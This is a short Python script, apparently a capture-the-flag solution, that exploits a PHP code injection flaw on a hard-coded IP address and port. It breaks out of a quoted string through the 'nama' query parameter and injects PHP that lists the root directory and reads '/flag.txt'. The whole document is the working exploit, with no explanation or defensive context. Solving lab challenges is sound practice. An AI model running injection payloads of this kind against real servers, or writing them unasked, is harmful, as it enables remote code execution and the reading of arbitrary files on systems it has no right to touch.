import requests

URL = "http://103.189.235.186:10001"


def req(payload, url=URL):
    res = requests.get(f"{url}/?{payload}")
    print(res.text)


def readdir(directory):
    req(("nama=';" +
        "$dh = opendir('{directory}');".format(directory=directory) +
         "$file = readdir($dh);"
         "while (($file = readdir($dh)) !== false){"
         ' echo "filename:" . $file . "\\n";'
         "}"
         ";//"
         ))


def readflag():
    req(("nama=';" +
        "echo readfile('/flag.txt');" +
         ";//"
         ))


if __name__ == "__main__":
    readdir("/")
    readflag()
